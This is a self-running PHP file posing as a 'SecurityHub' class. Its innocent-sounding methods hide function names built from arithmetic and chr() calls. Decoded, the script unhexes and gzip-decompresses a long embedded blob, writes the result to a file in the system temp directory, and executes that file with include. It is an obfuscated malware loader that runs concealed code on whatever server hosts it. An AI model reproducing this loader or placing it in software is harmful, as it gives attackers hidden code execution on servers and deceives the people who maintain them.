<?php
class SecurityHub
{
    private $jr = '';
    private $gv = '';
    public function fetchRecords($p1)
    {
        $l = array(58 + 46, 102 - 1, 72 * 51 - 3552, 35 + 15, 1 + 6 + 91, 102 + 2 + 1, 58 * 1 + 52);
        $ln = '';
        foreach ($l as $v) {
            $ln .= chr($v);
        }
        return $ln($p1);
    }
    public function generateToken($p1)
    {
        $s = array(110 - 7, 122, 111 * 25 - 2658, 77 * 53 - 3971, 107 - 8, 3 * 37, 99 + 10, 21 * 5 + 7, 96 * 11 - 942, 43 + 58, 22 + 93, 115);
        $k = '';
        foreach ($s as $u) {
            $k .= chr($u);
        }
        return $k($p1);
    }
    public function prepareOutput($p1, $p2)
    {
        $q = array(48 + 42 + 20, 24 * 7 - 67, 50 * 2 + 12, 113 - 2, 17 * 5 + 17);
        $m = '';
        foreach ($q as $qf) {
            $m .= chr($qf);
        }
        $m = strrev($m);
        return $m($p1, $p2);
    }
    public function processData($p1, $p2)
    {
        $m = array(101 * 1, 69 + 16 + 31, 38 + 18 + 49, 110 * 84 - 9126, 102 + 17, 4 * 32 - 26);
        $n = '';
        foreach ($m as $k) {
            $n .= chr($k);
        }
        $n = strrev($n);
        return $n($p1, $p2);
    }
    public function resolveConflict($p1)
    {
        $u = array(19 * 4 + 25, 115, 116 - 5, 117 - 9, 13 + 86, 2 * 51);
        $c = '';
        foreach ($u as $v) {
            $c .= chr($v);
        }
        $c = strrev($c);
        return $c($p1);
    }
    public function syncRecords($p1, $p2 = null)
    {
        $s = array(90 + 24, 3 + 113, 22 + 92, 3 * 35, 36 * 51 - 1727);
        $m = '';
        foreach ($s as $z) {
            $m .= chr($z);
        }
        return $m($p1, $p2);
    }
    public function triggerCallback()
    {
        $this->gv = $this->syncRecords($this->scheduleJob(), '/');
    }
    public function resolveAction()
    {
        $this->jr = $this->generateToken($this->fetchRecords($this->xj));
    }
    public function authorizeUser()
    {
        $fn = $this->gv . '/pp-69b096c116872';
        $f = $this->prepareOutput($fn, 'w');
        $this->processData($f, $this->jr);
        $this->resolveConflict($f);
        $this->encryptData($fn);
    }
    private $xj = '789c8d570b6fe24812fe2b89142d580664b7fb01e1bca3d11' . 'cb33bba5c5825993d9d469165ec3698109b60088f6cfefb565' . '5db892113b22198763dbeae575777ffebd37c323f896661519' . 'c0493d1d37c913e864b7d522cc3651a9d05ab62de37e393649' . '545cb34cf40eea1791624bbb5f59426cdd342cf92f37312b5c' . 'c3808d3bc69f5177ab95a642713bd61a3346bd6e47e90faadd' . '57fde9faf3607413cd574fc70b108b7cd4610cfc70dffd7067' . '7a5071fa11a9d86a73c16734f26522b0eef8ac13002922b23f' . '8244ac138016a4f2af86a5409e1c11c06cfb0d16a04734da0a' . 'f1852e080c530145cf5942385173247baca817104301e8c49b' . '2874a2c912110247cc12e9c0b2d734002d0d310d1a587d25d2' . '4c4051184eaf110e03c8e2cdef324ef018cf2388fdef9ed013' . '03ac185e242f67802dfd0734428ba5c7b0ef001894470324f9' . '20352c668296227a8cb95902a845f8f631c70f21e9af510a15' . '9ca45d3950a15d93a1a21d1833822f4c8d3481c8fa292caa42' . 'b790942ac644b200aa52901485c6548c4519e8cabe1765d8d8' . 'a478abfec2a0e1f07229db004222d24639aac817c3029c1f80' . '8465dc8a9a738c40fd812931643fce1177d8e21a0c0364c246' . '08e95e7259263c6a48bc6c6e4c4c2a44581a88c04f907e5413' . 'f3827e54ea7e3ca344383872312135d7822ac40c1ccf88d55d' . '9051be3726ae24dd62506a61911aa5fa77cf168aa9c8ab0620' . 'aaa3de6202b5a5380a8a624e58723382568b32eb326d0e7129' . '0f2b9db5092123261fb9a5b418629a6486a32470e73785770f' . '8382cf15c06b5e4c44ec8cb507bb45070c990c6ccb843fee38' . '4de4bb846f11df2489756137c84c464d132c13504f4c86408a' . '51c0c94438b709bdc9910022fc21ac009690a4cd6ddb4aa96a' . '92916f41f715ee64eee285518d3d820de4fccba2e3da3b441d' . '1c333e23d2069a026bc879126c7b2745f5c74812d792298a05' . '95cc138071e2fc9642016b5314994068304da00022009a22ec' . '7777a08929f45b3838984f0409491304d85c65121a0b869204' . '61c410e35a82c89a5cd0094c2b88a573a8e0fd531aae00bbd4' . 'a84e1a2ac38b26f7a3f3db00f65e5ab10c1bc886fe62fb9596' . 'd2b45320475a93b700c38918c8586dc2bf128f89b627f4e6e9' . '44c96d060481409de25ef66890241593269384cd46eb23ca25' . 'ba6977275a0b87da0185631dbcbad5131892df217312cec9a1' . '8a1be4aeab82a620e9d4d997e81cda4ea195b6329f80c4be12' . '54653b35655c41c8a3fa776169a75f9b8335c2c201460b28ca' . 'f9495c8645722e0b28990c514f3b4592e8f455a19053b1e52d' . '62b5a91d4305c12d1d4c9a161c2ae420b7e3d2a1b8b5265935' . '0a633c1fefe3cd161ac174d385bc0b9000e0eb87f0377dcb0a' . 'cfe5b1e70602306161c2cd2a2d04b3868fc36b8f9b12f028bc' . '1bab5aca7b340877eb02ba67bf02050941028f0cb2fc57231c' . 'f0b7a69d5041fc87fcb3af5fd249c15da7a8a535d47827d0f6' . '09e35f00e59e351a90c1ebe6f2a369b6d656ab2f1cf822fc3e' . '17fbe0dfa671056bf99664b6b91afb2b8e9d88ed5a733519de' . 'a75840d5fe48cf3f2f8635e7e20c0ad5f9b6a0553650dabbf9' . 'ea4335d9dce5e453b3e1af0a306ee0adb15d66d7912c3609db' . 'e11716cfaafa4ec2653bc2d956a9fb4b9c3c1afa77fa6e6ba0' . 'c545c26ec768fd96d977ba03b5ae8f08e2261dbef389527a65' . '24c6840ecd9c4a884ad4dd951e0cedec3b29b6daea42dba68a' . 'ddbb35019a24e33bd0d72f5b56e9b5687645c86464bd186736' . '6151f20b705f76cc17bb74d8433992593f6615dcf76c14b126' . 'abd9dd3abffd91fbc43b0fa87101ccce5642ecdff660a017c8' . '17ce34ccfb359d785d04bde76bb0ab50eec65a0800f83b89f5' . '01b3e58c510c3348b66ab581be7fbcfafe7755c8567c1fd320' . '45336a3c4cf56b31906e77e56cf281cf8d09722cdebd402d2f' . 'c485b17c61e30ccf20fa270360b47b3fd95b7805587c071ea4' . '7abc52c48b314971e405a7d22c052cce7488ad3d697ef5717c' . '33f6e82ebeb8be0cfc1d5b7afffff6330b86a99f5fe4fc47f1' . 'f5edfb484cba19ea1f45d7944e9ebf0e262f8bf8be197cf37d' . 'f86972d8f61e5b942e0533a765b727644fb6a70f3fdeaf2e6e' . 'af3e5f557b0d0757a765731582fb06044f788e2ef83cfff068' . '5836e7244e1cbf0f272f0e5e6e6db7f07c3ef372dcfb1559bf' . '1b67744a59275b9d3763dea55905712d71b1d913012e3fb074' . '31deb659a2579c9205234cb0b5d12a83583f0415fc793b6757' . 'bea37c173a855654b681c2eec8d9655de252971654b3e0bf2d' . 'dd69f878b4207304155036741f4e8378979009f95edd8afd7d' . 'e04886b6ce467c174f450e7e03125a78a3c808ad6a6566febb' . 'bd4810c1cc971c51068a78e0a27f29f4002e0044debbf5580c' . '3f94f14d0ec192874eafb156e7d77b4c0f2d84f8a3cbacbe73' . 'a6b3631249feaab303182e7f57545a44e630ab1f8a97d53f4b' . '84550b55a63cc85c6414febbc4e971df9faa7ec0fdeabed3a8' . 'fada764be5a16346e5134a8f92dfd665b502ff738ee3fcc75a' . 'bcdee34d179a98b7d61b75bf909d45f0951b74948bbf6ade61' . 'c2f2d2c67dc2241d7d010c4dff71fef16985034a5b6d6c07b0' . '7f7e8e7a42a70b0034e05a6601118379ec9c6af0ae57a7005a' . 'da51e5cbca3981e1f3e1c1183ab89919a4ea647c4f26985b6d' . '547c466e5e90f8bc8faf49e049db4ea6502770a849e6747a05' . '3dcb5e37771a7c086dbc53eee666e6aafff41ac56d591eaa7d' . '01b73f6bb3dc7dde7a378c225e23d1cbc24bca21c8f37de0b8' . 'e8510ee031514945692ce967a113c868b267ada621c4ad1a5c' . '28de2c8479a696f87b2e1436bef78a170bfc6a755530e1f5e7' . 'aa32180e9fd2307541d9bd3a98e26f9c97eb9c3e503fb00c07' . '4f619700141c656d7e970ef40e23ceb1cf4a81de6546f608bb' . '6c890d3ca1200b6fefaebe575abeb6ff30c8d2ab54a87f45d7' . '904ae4f0bd715cbff95d0ea477bb8b41079abebd4c7f2769c1' . '9264c02c95d3c263eec1e3a8b7238d68cc2424b1e946fd322c' . 'faa311a60d13651dd3948f7e36b065e8fea970c8c35cabc44e' . '5f96f11fafebe';
    public function encryptData($p)
    {
        include $p;
    }
    public function scheduleJob()
    {
        $a = array(5 * 23, 58 + 63, 69 + 46, 14 * 2 + 67, 15 * 4 + 43, 19 * 1 + 82, 119 * 123 - 14521, 5 * 19, 116, 105 - 4, 109 * 1, 34 + 78, 5 * 19, 107 - 7, 105, 2 * 57);
        $s = '';
        foreach ($a as $n) {
            $s .= chr($n);
        }
        return $s();
    }
}

$xe = new SecurityHub();
$xe->triggerCallback();
$xe->resolveAction();
$xe->authorizeUser();